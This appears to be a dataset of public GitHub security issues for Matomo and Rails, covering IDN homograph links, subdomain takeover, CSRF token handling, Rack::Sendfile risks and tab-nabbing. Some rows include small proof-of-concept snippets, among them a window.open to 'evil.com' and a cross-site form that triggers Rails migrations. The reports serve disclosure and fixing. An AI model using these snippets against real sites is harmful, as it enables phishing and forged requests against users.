Description: Please refer https://en.wikipedia.org/wiki/Internationalized_domain_name to know more about IDNs.
The IDN (Internationalized Domain Name) : http://ebÐ°y.com/
is a homograph for the latin ebay.com . if you click that first link, you might think that you are going to ebay.com but in fact, you are going to a homograph url http://xn--eby-7cd.com/

When such an IDN is present on profile (for ex if your follower is having access to see your profile). ,it displays IDN in Unicode. It would be safer to represent the Punycode version of the URL so that it would be apparent to the users that something wierd is going on. i.e show http://xn--eby-7cd.com/ instead of http://ebÐ°y.com/


steps:

1. ogin

2. go to all websites

3. click on add new website and new measurable website.

4. add : http://xn--eby-7cd.com/ in the URL's

5. as a hyperlink it is shown as : http://xn--eby-7cd.com/ but it will actually take you to http://xn--eby-7cd.com/

Thanks!

Note: Since hackerone already fixed this issue, you will bot say ebay site in this report, because it is filtering the unicode characters. you can follow up with the screenshot attached or you can ask me for more information.

Thanks!

Impact
A bad guy can exploit this vulnerability by putting up a spoof site behind one of these IDN links, posting the link anywhere on Pinterest (The talk section can be a nice place) and the user or the kraken moderator/admin opens and carelessly enters his credentials there.

",,no,"c: Security,"
matomo-org/matomo,236215143,"Access issues within core update function","When updating today, I realized that Piwik doesn't follow its own access rules when applying core updates.  Anonymous internet users are able to begin the core update process once the initial step is triggered.  Crucially, they are able to see not only the version in use but also the structure of the database and which SQL queries will be performed during the update. 

For Piwik sites without a proxy server blocking off-site connections, this could be a critical vulnerability as it reveals a large amount of information about the database, extensions in use, and other software installed on the server.  Through this, a malicious visitor would be much better prepared to attack the site. 

OS: Ubuntu Trusty 14.04 x64 
Version: upgraded from version 2.16.2 to the new version 3.0.4. 

Bug posted here after conversation with security@ (enclosed as they provide a workaround):

> That's true and this could be an issue.
> 1) Would you please create an issue in our tracker here: https://github.com/piwik/piwik/issues
> 
> 2) As a workaround, we recommend to put Piwik into maintenance mode, and then run the upgrade via the console: https://piwik.org/docs/update/#database-upgrade-for-high-traffic-piwik-servers
> Thanks for your report,
> 
> Matthieu
> Piwik Security team
",,no,"c: Security,"
matomo-org/matomo,188905979,"Make tmp/ folder path configurable in config file","For added security, it would be desired for some users to store the tmp/ folder (currently: the path/to/piwik/tmp/ folder), into a custom path such as `/tmp/piwik` (outside of the website itself so that it's not accessible from internet).

 Requested in #8120 and #10706 and several times by email and in forums. ","another reason why this might be a good idea is that the debian package places the `tmp` directory inside `/usr/share/piwik`, which afaik should not contain variable data.Maybe consider using TMPDIR if it is set?
I think php has some functions you can use to get temporary directories.",no,"c: Security,"
matomo-org/matomo,227035197,"Update the logme function to use password_verify rather than compare md5 strings","The standard accounting login system seems to function correctly with password_verify. It doesn't make much sense to have the [logme function](https://piwik.org/faq/how-to/faq_30/) work on MD5. This is especially an issue because MD5 is cryptographically insecure. ","We definitely need to change this eventually. Ideally we'd include eg oauth or something but passing md5 hash is not really a solution. Especially since you basically need to have the raw password to do this. To use password_verify we'd need the raw password which is not really a solution either or do you mean passing the password hash instead? Oauth wouldn't be too much work to implement for us but of course adds some overhead for the user but be more secure as it is now.Needing the raw password at the time of authentication isn't a bad thing; you ask the user to log in to a CMS, the CMS hashes the password, does its own login, and redirects to the logme function. At least in this use case, the logme function would work out-of-the-box, without requiring the server to log the MD5 hash somewhere in their CMS and somehow redirect that to the logme function. 

To be honest, I tried to find a solution to this myself; I dug through the source code to try and find where the MD5 hash comparison was being done, to see if I could alter it to use password_verify. However, I'm very unfamiliar with Piwik's source, and accounting security is paramount so I'm wary of doing anything too cavalier with it. > Needing the raw password at the time of authentication isn't a bad thing

yes that's true. The thing is you don't want to transfer the raw password over the network via URL parameter in a GET request which may appear in access logs etc. and possibly used over HTTP is no good :)Yeah, perhaps some kinda cURL interface so it can be done via POST?

Is there any other method of remote authentication? My usage of Piwik somewhat requires a single login process, having the user log in to my CMS and then into Piwik isn't really acceptable. Password requirements aren't an issue, this is a local piwik install and I've got them set up to share passwords.A customer is asking about the logme feature and the security implications. 

Btw I added this (bold part) in the FAQ as it seems it should work to POST data (and more safe)

> Important: we recommend to make this request over https (SSL) in order to keep the password hash secure, **and we also recommend to POST the `password` and `login` URL parameters (instead of sending it as GET parameters, which may be visible in browser history and web server access logs).**

Would be valuable to have oAuth for this or otherwise  use a secure hash for the passwords for this logme feature.",no,"c: Security,"
matomo-org/matomo,1295991345,"Insecure Transport: Weak SSL Protocol in /core/Http.php","In the file /core/Http.php, there is a protocol issue.  Line 386 contains the following:

$connectHost = 'ssl://' . $connectHost;

This is an insecure method and should be changed to:

$connectHost = 'tls://' . $connectHost;

Could this be updated in a future release?  I apologize in advance if this has already been reported.  I tried digging through the issues to see if it had been reported, but was unable to find a match.","Thanks for spotting this @DHammer-PT, It doesn't seem to have been reported previously.

As it appears to be trivial fix and would improve security I've flagged it for a priority review.@tsteur are you happy for this to be scheduled as a security improvement?Is there any chance of breaking anything? If not, then could do it. If there's a chance then we'd need to look at this and do it in Matomo 5`tls://` has been supported since PHP 4.3.0

>If OpenSSL support [is installed](https://www.php.net/manual/en/openssl.installation.php), you may prefix the hostname with either ssl:// or tls:// to use an SSL or TLS client connection over TCP/IP to connect to the remote host.

https://www.php.net/manual/en/function.fsockopen.php

For what it's worth I did a quick test by modifying `Http::getTransportMethod` to always use `socket` instead of `curl` and then made the `ssl://` to `tls://` change. Retrieving plugin information in the Marketplace uses this method, a break point check confirms that the `tls://` line was used and completed without any errors.
I don't think the issue is as much of a problem with ssl:// working or not working, but rather that ssl:// is seen as obsolete and tls:// is the modern standard.  TLS is the more secure method.Do we know if `ssl://` really means ""connect with a socket using SSL 3.0""? I can find very little information about this.
But it might just be an alias as I doubt many PHP setups even support any version older than TLS 1.0. And at least on my PC openssl (3.0.3) doesn't even support any SSL 3.0 options any more.  

Also no *.matomo.org domain has supported SSL 3.0 in quite a long time, so does that mean the socket method was broken for all Matomo users for a long time now? If so, we should maybe think about removing it (as at least for me using curl feels a lot more reliable than an improvised HTTP client over a raw socket).",no,"c: Security,"
matomo-org/matomo,37353489,"Add window.name= %buster% to prevent UI redressing","This is a best practise/non critical issue, which was reported by Marcus Niemietz, a Web security researcher at the
Ruhr-University Bochum in Germany.

See the attached video for a demo of the hack. It requires a bit of user interaction.

```
Proof of Concept:
--------------------
<a
  target=""public_handle""
  href=""http://www.example.org"">
    Example.org
</a>
<a
  href=""#""
  onclick=""window.open('//evil.com', 'public_handle'); return false;"">
    Example.org
<a/>

By clicking on the first link (which is on attackers.org), there will 
be opened a window/tab with the name ""public_handle"" and the address
""example.org"". Thus, there are for examples two tabs: One from the
attacker where the above code is (attackers.org), the other with the
Piwik installation (example.org). After clicking on the ""example.org""
tab, the user will click on the tab of the attacker - for e.g. social
engineering reasons. By clicking on the second link, there will be
opened ""evil.com"" on the tab with the name ""public_handle""; therefore,
the tab with ""example.org"" will change the address to ""evil.com"". The
user is looking on this tab now (with the name ""public_handle"") and
thinks: ""Hey, I'm logged out. I will type in my username and
password."" - but this is actually the web page of the attacker.

You can use such a line of JavaScript code to fix this issue:
<script type=""text/javascript"">>window.name=""%TOKEN%"";</script>

%TOKEN% should be a server-side randomly generated string. By using
this, an attacker cannot guess the name of the window. Furthermore, a
by the attacker specified name will be overwritten.

[...]

Beside that there is another thing that you can implement:
<script type=""text/javascript"">document.designMode='off';</script>

You can find more information about it in my paper
(http://ui-redressing.mniemietz.de/uiRedressing.pdf) on the pages 33
and 34. It can be used to deactivate (no frame buster will work) and
(not documented) inject JavaScript code.

```
","Attachment: demo of non critical issue
[piwik.avi](http://issues.piwik.org/attachments/2966/piwik.avi)
Maybe stick these js snippets into the iframe buster body template?
Another note from Marcus:

```


You should at the HTTP-Header ""X-Xss-Protection: 0"" to disable the XSS
filters of IE and Chrome. They can be used to deactivate e.g.
frame-buster in the following way:

victim.html:
---
<script type=""text/javascript"">
  if (parent.frames.length > 0){
    top.location.replace(document.location);
  }
</script>

attacker.html:
---
<iframe src=""http://www.example.org/?xyz=%3Cscript%20type=%22
text/javascript%22%3Eif"">
</iframe>

The same strategy can be used to deactivate ""window.name"" or
""designMode"". Thus, you should add this header to gain a better
security.
```
If someone can submit a patch that would be appreciated.
",no,"Task,c: Security,"
matomo-org/matomo,1200752294,"Notify that requests to matomo.org will soon use HTTPS by default","This applies to all api.matomo.org and plugins.matomo.org calls.

1. First we add a new required system check showing to users if the connection over HTTPS works or not for these endpoints. If it doesn't work, then there should be an error shown explaining that we will soon switch to HTTPS by default. They should either make HTTPS work or disable HTTPS (see next item). We should mention the consequences of not fixing this issue (eventually won't receive any updates anymore big security issue for sure, and using HTTP is a minor security issue that someone could pretend there is no longer an update available)

2. We introduce a setting to force HTTP instead of HTTPS as some people won't be able to change their PHP either because the hoster doesn't allow it or because they aren't technical enough etc.

3. Create an FAQ about how to make HTTPS work or disable HTTPS and link to it in the system check error message in 1 above.

","@peterhashair did number 3 get done also regarding creating or updating the FAQs? Be good to link to that in this issue for completeness when done.FAQ here: [https://matomo.org/faq/faq-how-to-disabâ€¦omo-org-requests/](https://matomo.org/?post_type=faq&p=55687&preview=true)reopen this issue, as we discussed,  not to force users to use HTTPS at this stage, only a warning message. In the next stage we will force HTTPS connections. Ref Here: https://github.com/matomo-org/matomo-security/issues/195removing from 4.11. milestone, as the remaining tasks will be solved in a later verion.",no,"Major,Enhancement,c: Security,c: Documentation,"
rails/rails,1090726806,"Security - Subdomain Takeover at https://new.rubyonrails.org/","### Preface

I tried to reach you in every way possible, emails didn't work, no answer on HackerOne for 2 weeks - https://hackerone.com/reports/1429148

so I will try as last resort to report it here for you to fix it.

If a malicious actor would have captured it, he could store download links of rubyonrails under your main domain with crypto miners / trojan horses...

## Summary
Hi!

I discovered that new.rubyonrails.org was pointing to an unclaimed Github Page, making it vulnerable to subdomain takeover.
I've managed to claim it in my Github-account and added a simple html file as POC:

`https://new.rubyonrails.org`

## Mitigation
- Remove the DNS record

Best regards,
nagli

## Impact

Subdomain takeovers can be used for
- Cookies set to the root domain will be shared with this subdomain and can be obtained
- Stored XSS (arbitrary javascript code can be executed in a users browser)
- Phishing
- Hosting malicious content

",,no,"security,"
rails/rails,627439129,"HTML fallback for .js paths is dangerous","This issue came in from Hackerone ([here is the link](https://hackerone.com/bugs?subject=rails&report_id=167778) for those with access).  I'm filing an issue here because the Hackerone ticket is very old, and I don't see any way to actually fix the issue without definitely breaking backwards compatibility.

The issue is that controllers will fall back to HTML for `.js` requests (unless the controller uses an explicit `respond_to` handler).  For example a controller like this:

```ruby
class ContributorsController
  def index
    @contributors = if params[:release_id].present?
      set_release
      Contributor.all_with_ncommits_by_release(@release)
    else
      Contributor.all_with_ncommits
    end
  end
end
```

(I stole this code from [here](https://github.com/rails/rails-contributors/blob/d4d5066527783d9eb2c3603e08d798bd76800b50/app/controllers/contributors_controller.rb) to show this is a problem with real apps).

If someone makes a request to this with a `.js` extension, Rails will render the HTML template since there is no JS template.  If you go to [this link](https://contributors.rubyonrails.org/contributors/in-time-window/this-week.js) you can see that the HTML view is rendered even though we asked for `.js`.

The issue is that some caching proxies will see the `.js` extension and cache the response, including any authenticity tokens.  A crafty attacker could send someone a link to a Rails app that's behind a proxy like this, but with a `.js` extension.  After the victim clicks the link, the attacker can access the proxy and steal the cached authenticity token.

My personal opinion is that we should eliminate the fallback from `.js`.  If someone requests a `.js` and there is no template, we should 404 or something.  However, I'm also 99% sure that someone is relying on this behavior and we'll break apps.","My recommendation for existing apps is that people should always use `respond_to` in their controllers and limit response types.ðŸ‘‹ Is this still considered an issue?@gurshafriri Yeah. See the open PR #39476 to track work status on this issue.",no,"security,"
rails/rails,97612173,"Add parameter filter capability for redirect locations","This is a follow up of #14055 taking in consideration @jeremy's comments.

It uses the `config.parameter_filter` to match what needs to be filtered. The result would be like this:

```
Redirected to http://secret.foo.bar?username=roque&password=[FILTERED]
```

By security default, if no filter is provided, it ~~filters all parameters~~ does not filter any parameter.

/cc @trevorturk

UPDATE: changed the default behavior.
","Thanks for picking this up, @repinel! I'm not sure that filtering all parameters by default makes sense. Don't you think filtering the same things as the existing incoming parameter filter has makes more sense? 
@trevorturk Yes. IMO, I would follow the existing behavior and keep it consistent. I'll wait for people to jump into discussion before changing it. Thanks!
r? @rafaelfranca 
@kaspth I updated it to use `fetch_header` instead of `request.env.fetch`. Thanks
This needs to be rebased. Would you mind rebase this against master and force push to your branch?
@sikachu It should be good now. Thanks
Ping @sikachu 
I have some styling comments. The rest looks fine.
@sikachu I made the changes you suggested. See if that two constants are now more readable.

Thanks for reviewing!
@repinel if this is still an issue, would you mind checking the merge conflicts?",yes,"actionpack,security,"
rails/rails,787702832,"Remove Rack::SendFile from default middleware.","### Steps to reproduce

Example of rails controller.

```ruby
class FilesController < ApplicationController
  def index
    send_file(""./README.md"")
  end
end
````

Code like the one above can be attacked by a specially crafted request.
See [hackrone](https://hackerone.com/reports/1057216) for details on the attack code.

### Actual behavior

[Rack::SendFile](https://github.com/rack/rack/blob/v2.2.2/lib/rack/sendfile.rb) used in [send_file](https://api.rubyonrails.org/classes/ActionController/DataStreaming.html#method-i-send_file) has the following risks if proxy is not set properly.

- ReDoS via Regex Injection
- Unexpected access to nginx internal


It has been suggested to remove Rack::SendFile from the default in the hope that the user will handle the proxy properly.


### System configuration
**Rails version**: *

**Ruby version**: *
","@ooooooo-q the hackerone report isn't public.@rafaelfranca Do you know if this was already addressed? Or if there's already a report filed should we close the issue?@lfalcao @zzak 

I requested disclosure of the report on hadkerone a few months ago, but it has not been supported yet.
Therefore, I don't know if it's okay to publish the details at my discretion.

Probably the same problem is reported to shopify ( https://hackerone.com/reports/1027873 ).

`Rack::SendFile` is supposed to set the proxy correctly,
It may have unintended effects as it is currently built in as Rails default middleware.

Therefore, in the hackerone report, @tenderlove suggested removing it from Rails' default middleware and asked to create an issue, so I wrote it here.
@lfalcao @zzak

The report of hackerone has been disclosed. (@rafaelfranca thank you)@ooooooo-q Thanks, would you be willing to [send a PR](https://guides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-code)?Referencing the discussion in the PR https://github.com/rails/rails/pull/42635 cc @ghiculescu

If we replace `Rack::Sendfile` with a dummy, the optional config won't set the headers anymore via `x_sendfile_header`

```ruby
Rails.application.configure do
  #...
  
  # Specifies the header that your server uses for sending files.
  # config.action_dispatch.x_sendfile_header = 'X-Sendfile' # for Apache
  # config.action_dispatch.x_sendfile_header = 'X-Accel-Redirect' # for NGINX
end
```
https://github.com/rails/rails/blob/d6bf7d97238c957f717dfcd1aee88aad0edd6772/actionpack/lib/action_dispatch/railtie.rb#L9
We can maybe raise a deprecation warning when the `x_sendfile_header` is explicitly set? Or directly cut it out?

Or maybe only raise deprecation warnings(when the middleware was referenced in middleware operations or  when  `x_sendfile_header` is explicitly set), without replacing `Rack::Sendfile` with a dummy to preserve the current functionality a little longer?

Either way, @eugeneius is correct. `send_file` works even without `Rack::Sendfile`

What is the best way to proceed with this? We should remove all configs that are used by `Rack::Sendfile`. Rails should not include that in the middleware stack anymore. If uses want to use `Rack::Sendfile`, and they should be able to, they will have to explicit call `use Rack::SendFile, 'X-Sendfile'`. I find the built-in Sendfile configuration to be a useful feature and it'd be a shame to see it scrubbed from Rails, even if the default configuration is too loose at present.

Instead of dropping this functionality, what about inheriting/modifying the default `Rack::Sendfile` with a version that's only configured from `production.rb` (etc) and disallows the outside headers (which seems to be the real concern)? Just a sketch:

```ruby
class ActionDispatch::Sendfile < Rack::Sendfile
  def call(env)
    if (!variation(env) && env['HTTP_X_SENDFILE_TYPE']) ||
        (@mappings.blank? && env['HTTP_X_ACCEL_MAPPING'])
      # show deprecation message that headers are no longer used, are
      # potentially insecure by default, and to switch back to native
      # Rack::Sendfile if actually wanted.
    end
    super
  end
  private
  def variation(env)
    @variation || env['sendfile.type']
  end
  def map_accel_path(env, path)
    if mapping = @mappings.find { |internal, _| internal =~ path }
      path.sub(*mapping)
    end
  end
end
```

Then, add `config.action_dispatch.x_sendfile_mapping` to configure the mappings for `ActionDispatch::Sendfile`. Generating an error when `x_sendfile_header` is present without `x_sendfile_mapping` would help apps make the transition.

An app can still to intentionally go back to `Rack::Sendfile` if its proxy is properly configured and the original behavior is wanted, but I feel this provides an easier path forward for apps that have been relying on the built-in functionality via `x_sendfile_header`.

Additionally, it helps maintain discoverability of `X-Sendfile`-like functionality for future Rails developers.> disallows the outside headers

I think this is the main issue.  How do you tell if a header is ""outside"" or not?  I don't think there's a way for Rails to know this.  Probably you could set an allow-list for internal headers, but this seems really application specific.

Have I missed something?> How do you tell if a header is ""outside"" or not?

You don't. The proposal was to take what's currently configured via the `X-Sendfile-Type` and `X-Accel-Mapping` headers and move that configuration into Rails itself, probably into `production.rb` or an initializer (likely adjacent to any existing `config.action_dispatch.x_sendfile_header` config. Then quit reading the external headers at all.

Summing up: rather than attempt to whitelist the headers, skip them entirely and provide an alternate, secured configuration mechanism.@zarqman ah yes, I think I understand.  Sorry I must have misunderstood your initial post.  It makes sense to me.  `@mappings` would come from the application configuration (if I understand correctly).",no,"actionpack,security,"
rails/rails,400379221,"ActiveStorage: no authentication for direct uploads?","The only security measure `ActiveStorage::DirectUploadsController` has is `protect_from_forgery with: :exception`. The `DirectUpload` js client fetches the csrf token from the page header to pass this security check: `this.xhr.setRequestHeader(""X-CSRF-Token"", getMetaValue(""csrf-token""))`.

Since any Rails generated pages may have this token, The door to upload files is open. Some ActiveStorage users are using ActiveStorage to provide permanent public image links. If the public link can be guessed from the blob information that `DirectUpload` js client gets, unauthorized users may be able to upload and share files.

Because a direct upload input behaves like a form, I think we should apply the idea of per form csrf token. This means each input field with `direct_upload: true` should have a direct upload csrf token. If a page has multiple such fields, these fields can share the same token. This way, only users with access to pages with direct upload fields can have this token. 

Or even better, the controller can optionally accept a proc to authenticate user. And `DirectUpload` should accordingly allow setting custom headers. This will also be useful to API only Rails apps.","This issue has been automatically marked as stale because it has not been commented on for at least three months.
The resources of the Rails team are limited, and so we are asking for your help.
If you can still reproduce this error on the `5-2-stable` branch or on `master`, please reply with all of the information you have about it in order to keep the issue open.
Thank you for all your contributions.
",no,"security,activestorage,"
rails/rails,960164852,"unsafe query generation?","### Steps to reproduce

There's a weird bug, I think it's related to unsafe query generation, and there's action controller leakage.

Similar vulnerabilities can be found with these IDS `CVE-2016-6317,CVE-2012-2660, CVE-2012-2694`
and `CVE-2013-0155.`

### Actual behavior


For example:

https://github.com/Alaa-abdulridha?tab=repositories&q[].=&type[].=1

then we could use & operator to get a new result with nil

https://github.com/Alaa-abdulridha?tab=repositories&q[].&=&type[].&=1

I believe all rails applications are vulnerable.

![image](https://user-images.githubusercontent.com/53356539/128158385-cddd0644-cf28-4726-b033-cfc0e2fe3f04.png)

```ruby
[#<ActionController::Parameters {"".""=>""""} permitted: false>]
```
```ruby
[#<ActionController::Parameters {"".""=>nil} permitted: false>]
```
I have managed to mitigate this issue, by a simple solution as below:

```ruby
def block_array_parameters
      params.each do |key, value|
        if key != 'controller' && key != 'action'
          if params[key].is_a? Array
		    key = key.gsub(/\W/, """")
            render status: 403, json: JSON.pretty_generate({ error: ""`#{key}` parameter can't be an array."" })
          end
        end
      end
    end
```


Here I made a simple project vulnerable with this bug,

https://github.com/Alaa-abdulridha/RailsApplication

![image](https://user-images.githubusercontent.com/53356539/128159585-c14776dd-cc19-4c1b-94b1-a082aa81cddc.png)

If you notice on the `application_controller.rb` file lines between 23 and 32, I've added the code above, it's not activated only if you uncommented line 3
This is a simple solution I've made just to give you an Idea maybe about how to fix it.

You can test this issue on the `home_controller` e.g. the `search` parameter and as below:

```ruby
class HomeController < ApplicationController

	def index
		@post = Post.includes(:user).where(status: 0).order(created_at: :desc).page params[:page]
	end

	def search
		if params[:search] != """"
           @results = Post.where('lower(name) iLIKE ?', ""%#{params[:search]}%"").order(:created_at)
           @user = User.where('lower(name) iLIKE ?', ""%#{params[:search]}%"").order(:created_at)
       end  
    end
end
```



The above solution will work If your controllers are inherited from the application controller, It filter all the controller's parameters.

But the issue with this solution, if your application is using the nested parameters it won't work, as below:
```ruby
      @card.name = params[:credit_card][:name]
      @card.address_line1 = params[:credit_card][:address_line1]
      @card.address_line2 = params[:credit_card][:address_line2]
```

### System configuration
**Rails version**: Latest version.

**Ruby version**: Latest version.
","Hi @Alaa-abdulridha,
Thanks for reporting the issue!

For next time, please do not report security vulnerabilities with public GitHub issue reports. See: https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#special-treatment-for-security-issues

It seems like issue should be handled by using StrongParameters:
https://edgeguides.rubyonrails.org/action_controller_overview.html#strong-parameters> Hi @Alaa-abdulridha,
> Thanks for reporting the issue!
> 
> For next time, please do not report security vulnerabilities with public GitHub issue reports. See: https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#special-treatment-for-security-issues
> 
> It seems like issue should be handled by using StrongParameters:
> https://edgeguides.rubyonrails.org/action_controller_overview.html#strong-parameters

Hi @p8 , 

Already reported it on HackerOne to rails, and they said ` We're trying to figure out the best place to fix this` also,

> tenderlove Ruby on Rails staff
> Aug 3rd (24 hrs ago)
> Hi ,
> Would you mind filing an issue for this in the public issue tracker? This seems pretty hard to understand or reproduce so I > would like to get more eyes on it.
> Thank you!

Thanks.This has been reported to HackerOne and it was decided to make it public. @Alaa-abdulridha thanks ðŸ˜„",no,"actionpack,security,"
rails/rails,233811314,"Reject global csrf token if per form tokens are enabled","Currently global CSRF token can be used to override per-form CSRF token. This PR changes that. If per-form CSRF tokens are enabled, an actual per-form CSRF token has to be passed to avoid `InvalidAuthenticityToken`.","Thanks for the pull request, and welcome! The Rails team is excited to review your changes, and you should hear from @pixeltrix (or someone else) soon.

If any changes to this PR are deemed necessary, please add them as extra commits. This ensures that the reviewer can see what has changed since they last reviewed the code. Due to the way GitHub handles out-of-date commits, this should also make it reasonably obvious what issues have or haven't been addressed. Large or tricky changes may require several passes of review and changes.

This repository is being automatically checked for code quality issues using <a href=""https://codeclimate.com"">Code Climate</a>. You can see results for this analysis in the PR status below. Newly introduced issues should be fixed before a Pull Request is considered ready to review.

Please see [the contribution instructions](http://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html) for more information.
cc/ @rails/security Hey @kv109 I cloned the repo in the original issue, made a new scaffold for User. I then opened 2 tabs and pasted the CSRF token from Post into User and saw invalid authenticity token, as expected.

Do you have a repo that reproduces the issue you're seeing that you could share?Hi @eileencodes!

Link to [repo](https://github.com/kv109/per-form-csrf-test).
[Screencast](https://www.youtube.com/watch?v=05RTefpaFss&feature=youtu.be) with copy-pasting token.

### Steps to create the app
```bash
Kacpers-MacBook-Pro:tmp kacperwalanus$ rvm current
ruby-2.4.1
```
```bash
Kacpers-MacBook-Pro:tmp kacperwalanus$ rails -v
Rails 5.1.1
```
```bash
Kacpers-MacBook-Pro:tmp kacperwalanus$ rails new per-form-csrf
      create
      create  README.md
      create  Rakefile
      create  config.ru
      create  .gitignore
      create  Gemfile
         run  git init from "".""
Initialized empty Git repository in /Users/kacperwalanus/projects/tmp/per-form-csrf/.git/
      create  app
      create  app/assets/config/manifest.js
      #...
      create  package.json
      remove  config/initializers/cors.rb
      remove  config/initializers/new_framework_defaults_5_1.rb
         run  bundle install
The dependency tzinfo-data (>= 0) will be unused by any of the platforms Bundler is installing for. Bundler is installing for ruby but the dependency is only for x86-mingw32, x86-mswin32, x64-mingw32, java. To add those platforms to the bundle, run `bundle lock --add-platform x86-mingw32 x86-mswin32 x64-mingw32 java`.
Fetching gem metadata from https://rubygems.org/.........
Fetching version metadata from https://rubygems.org/..
Fetching dependency metadata from https://rubygems.org/.
Resolving dependencies...
Using rake 12.0.0
Using concurrent-ruby 1.0.5
Using i18n 0.8.4
Using minitest 5.10.2
Using thread_safe 0.3.6
Using builder 3.2.3
Using erubi 1.6.0
Using mini_portile2 2.2.0
Using rack 2.0.3
Using nio4r 2.1.0
Using websocket-extensions 0.1.2
Using mime-types-data 3.2016.0521
Using arel 8.0.0
Using public_suffix 2.0.5
Using bindex 0.5.0
Using bundler 1.14.6
Using byebug 9.0.6
Using ffi 1.9.18
Using coffee-script-source 1.12.2
Using execjs 2.7.0
Using method_source 0.8.2
Using thor 0.19.4
Using multi_json 1.12.1
Using rb-fsevent 0.9.8
Using ruby_dep 1.5.0
Using puma 3.9.1
Using rubyzip 1.2.1
Using sass 3.4.24
Using tilt 2.0.7
Using websocket 1.2.4
Using sqlite3 1.3.13
Using turbolinks-source 5.0.3
Using tzinfo 1.2.3
Using nokogiri 1.8.0
Using rack-test 0.6.3
Using sprockets 3.7.1
Using websocket-driver 0.6.5
Using mime-types 3.1
Using addressable 2.5.1
Using childprocess 0.7.0
Using rb-inotify 0.9.8
Using coffee-script 2.4.1
Using uglifier 3.2.0
Using turbolinks 5.0.1
Using activesupport 5.1.1
Using loofah 2.0.3
Using xpath 2.1.0
Using mail 2.6.5
Using selenium-webdriver 3.4.0
Using listen 3.1.5
Using rails-dom-testing 2.0.3
Using globalid 0.4.0
Using activemodel 5.1.1
Using jbuilder 2.7.0
Using spring 2.0.2
Using rails-html-sanitizer 1.0.3
Installing capybara 2.14.0
Using activejob 5.1.1
Using activerecord 5.1.1
Using spring-watcher-listen 2.0.1
Using actionview 5.1.1
Using actionpack 5.1.1
Using actioncable 5.1.1
Using actionmailer 5.1.1
Using railties 5.1.1
Using sprockets-rails 3.2.0
Using coffee-rails 4.2.2
Using web-console 3.5.1
Using rails 5.1.1
Using sass-rails 5.0.6
Bundle complete! 16 Gemfile dependencies, 70 gems now installed.
Use `bundle show [gemname]` to see where a bundled gem is installed.
         run  bundle exec spring binstub --all
* bin/rake: spring inserted
* bin/rails: spring inserted
```

```bash
cd per-form-csrf
```

```bash
bin/rails g scaffold Post title:string
Running via Spring preloader in process 44419
      invoke  active_record
      create    db/migrate/20170607134728_create_posts.rb
      create    app/models/post.rb
      # ...
```

```bash
bin/rails g scaffold User name:string
Running via Spring preloader in process 44443
      invoke  active_record
      create    db/migrate/20170607134730_create_users.rb
      create    app/models/user.rb
      # ...
```
```bash
bin/rails db:migrate
Kacpers-MacBook-Pro:per-form-csrf kacperwalanus$ bin/rails db:migrate
== 20170607134728 CreatePosts: migrating ======================================
-- create_table(:posts)
   -> 0.0008s
== 20170607134728 CreatePosts: migrated (0.0009s) =============================

== 20170607134730 CreateUsers: migrating ======================================
-- create_table(:users)
   -> 0.0008s
== 20170607134730 CreateUsers: migrated (0.0009s) =============================
```
@eileencodes were you able to reproduce this?
#pingingPolitelyHey sorry for the delay @kv109. So I have looked at this and it seems that when you refresh the page the token is replaced by the global token. This is because of JS we have that does that replacement https://github.com/rails/rails/blob/master/actionview/app/assets/javascripts/rails-ujs/utils/csrf.coffee.

This is a bug but I'm not sure how to fix it. Your fix provided here will reject all requests on refresh so it's not the right solution. I don't know if we can skip that js specifically for per-form tokens - we would have to change the token somehow. Let me know if you have any idea.@eileencodes Do you know the history of the JS in `csrf.coffee`? In what scenario would JS be required in this process? Is it for AJAX only?

I verified in two ways that in the use case presented by @kv109, JS is not needed to enforce per-form tokens. One is by disabling JS in the browser and trying the same thing @kv109 did (copy the token from one form to the other), and you will get the `InvalidAuthenticityToken` error as expected.

Alternatively, you can leave JS enabled in the browser, but remove `//= require rails-ujs` from `application.js`, and you will get the expected error in that scenario as well.@monfresh yes I do know the history and it's for ajax cached forms. Here's the original PR https://github.com/rails/jquery-ujs/pull/350
I can still reproduce this using Rails 6.1.4.",yes,"security,rails-ujs,"
rails/rails,771518021,"CSRF ActionableExceptions middleware","https://github.com/rails/rails/blob/v6.1.0/actionpack/lib/action_dispatch/middleware/actionable_exceptions.rb

XSS with ActionableExceptions has been fixed in 6.0.3.4, but there is still an issue with accepting cross site requests.
Therefore, there are the following problems in the development environment.

I suggest limiting the requests this middleware accepts to ajax requests with custom headers (x-requested-with).

For more information [hackerone](https://hackerone.com/reports/904059).

### Steps to reproduce

example attack server.

```html
<form method=""post"" action=""http://localhost:3000/rails/actions?error=ActiveRecord::PendingMigrationError&action=Run%20pending%20migrations&location=https://www.hackerone.com/"">
    <button type=""submit"">click!</button>
</form>
```

### Expected behavior

Block cross site request.

### Actual behavior

- Run pending migrations by CSRF
- Open redirect (from POST method)
- HTTP header injection

### System configuration

**Rails version**: 6.1.0

**Ruby version**: ruby 2.7.1p83","Sorry. HTTP header injection was fixed in 6.0.3.4.",no,"actionpack,security,"
rails/rails,319052027,"Request Forgery takes relative paths into account","Passing relative paths into form_for and related / derived helpers led to invalid
token generations, as the tokens did not match the request.path on the
POST endpoint. Variants, such as:

```
form_for url: """" do
```

Wouldn't generate a matching csrf-token and led to an InvalidAuthenticityToken.

I've added test + code to handle the common cases, such as:

* """"
* ""./""
* ""./post_one""
* ""post_one""

are now handled according to [RFC 3986 5.2 - 5.4](https://tools.ietf.org/html/rfc3986#section-5.2). 


Not implemented from RFC: double dots are not handled (../../path)

relevant/ fixing issue: #31191
","Hello Rails team, 
Please give your attention to this PR!

I also stumbled upon the bug this PR is designed to fix.
I wasted half a day by digging into actionpack/lib/action_controller/metal/request_forgery_protection.rb to know `per_form_csrf_tokens` is the culprit... (I learnt a lot about rails csrf protection mechanism though, thanks ;-)

Also, I think it also has a security concern because if user developers of Rails cannot do workaround the bug and decided to turn off `protect_from_forgery`... Can you imagine?@eileencodes not sure if you're aware of this PR or the linked issue or if you think it makes sense for either to have the security label.@hiroshi You can just `form_for url: request.path` as @zealot128 suggested, don't disable it just yet :)> You can just form_for url: request.path as @zealot128 suggested, don't disable it just yet :)

The problem is not how to avoid the pitfall. I learnt where the pitfall is at least, but others can fall.
Why don't you just remove the pitfall?
A collegue ran into this bug again in production, after not receiving after upgrading a older client Rails app to later Rails versions... This bug might slip through test, because by default in Test there is no CSRF protection enabled.

Could a maintainer please check if this could be merged? :) 

